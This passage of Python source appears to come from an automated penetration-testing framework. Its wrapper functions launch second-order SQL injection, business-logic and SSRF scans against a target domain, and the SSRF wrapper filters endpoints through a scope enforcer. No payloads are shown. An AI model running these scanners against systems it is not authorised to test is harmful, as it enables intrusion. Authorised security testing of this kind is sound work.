) -> list[dict]:
    """Sprint 20 P3 — Second-order SQL injection scan."""
    try:
        from pentra_tools.vuln.second_order_sqli import run_second_order_sqli_test as _sqli2_fn
    except ImportError:
        return []

    in_scope: list[str] = scope.get("in_scope", [])
    if not in_scope:
        return []

    base_url = f"https://{domain}" if not domain.startswith("http") else domain
    auth_headers: dict[str, str] = {}
    if auth_credentials:
        try:
            from pentra_tools.auth.session_manager import AuthCredentials, SessionManager
            _creds = AuthCredentials(**auth_credentials)
            if not _creds.is_empty() and _creds.type != "auto_login":
                auth_headers, _ = SessionManager(_creds).get_auth_headers()
        except Exception:
            pass

    try:
        findings = await _sqli2_fn(
            base_url=base_url,
            auth_headers=auth_headers or None,
            proxy_url=_get_burp_proxy(),
        )
        if findings:
            log.info("[vuln_hunt] Second-order SQLi: %d finding(s)", len(findings))
        return findings
    except Exception as exc:
        log.debug("[vuln_hunt_node] Second-order SQLi scan failed (non-fatal): %s", exc)
        return []


async def _run_business_logic_scan(
    domain: str,
    scope: dict,
    auth_credentials: dict | None = None,
) -> list[dict]:
    """Sprint 20 P3 — Business logic vulnerability scan."""
    try:
        from pentra_tools.vuln.business_logic import run_business_logic_test as _biz_fn
    except ImportError:
        return []

    in_scope: list[str] = scope.get("in_scope", [])
    if not in_scope:
        return []

    base_url = f"https://{domain}" if not domain.startswith("http") else domain
    auth_headers: dict[str, str] = {}
    if auth_credentials:
        try:
            from pentra_tools.auth.session_manager import AuthCredentials, SessionManager
            _creds = AuthCredentials(**auth_credentials)
            if not _creds.is_empty() and _creds.type != "auto_login":
                auth_headers, _ = SessionManager(_creds).get_auth_headers()
        except Exception:
            pass

    try:
        findings = await _biz_fn(
            base_url=base_url,
            auth_headers=auth_headers or None,
            proxy_url=_get_burp_proxy(),
        )
        if findings:
            log.info("[vuln_hunt] Business logic: %d finding(s)", len(findings))
        return findings
    except Exception as exc:
        log.debug("[vuln_hunt_node] Business logic scan failed (non-fatal): %s", exc)
        return []


async def _run_ssrf_scan(
    endpoints: list[dict],
    scope: dict,
    auth_credentials: dict | None = None,
) -> list[dict]:
    """Task 22.1 — SSRF + OOB callback detection on URL-parameter endpoints.

    Identifies endpoints with SSRF-prone parameters (url, src, redirect, fetch…),
    probes them with internal/cloud metadata payloads, and optionally sends OOB
    canary URLs for blind SSRF detection.
    """
    try:
        from pentra_tools.vuln.ssrf_oob_tester import scan_ssrf_on_endpoints
    except ImportError:
        return []

    in_scope: list[str] = scope.get("in_scope", [])
    enforcer = ScopeEnforcer(in_scope=in_scope, out_of_scope=scope.get("out_of_scope", []))
    burp_proxy = _get_burp_proxy()

    auth_headers: dict[str, str] = {}
    if auth_credentials:
        try:
            from pentra_tools.auth.session_manager import AuthCredentials, SessionManager
            _creds = AuthCredentials(**auth_credentials)
            if not _creds.is_empty() and _creds.type != "auto_login":
                auth_headers, _ = SessionManager(_creds).get_auth_headers()
        except Exception:
            pass

    # Filter endpoints to in-scope only
    scoped_endpoints = []
    for ep in endpoints:
        url = ep.get("url", "")
        if not url:
            continue
        try:
            enforcer.validate_or_raise(url)
            scoped_endpoints.append(ep)
        except ScopeViolationError:
            continue

    if not scoped_endpoints:
        return []

    try:
        findings = await scan_ssrf_on_endpoints(
            endpoints=scoped_endpoints,
            auth_headers=auth_headers or None,
            oob_canary=None,  # OOB requires Collaborator — skipped unless configured
            proxy_url=burp_proxy,
            max_endpoints=10,
        )
        if findings:
            log.info("[vuln_hunt] SSRF: %d finding(s) on %d candidates", len(findings), len(scoped_endpoints))
        return findings
    except Exception as exc:
        log.debug("[vuln_hunt_node] SSRF scan failed (non-fatal): %s", exc)
        return []
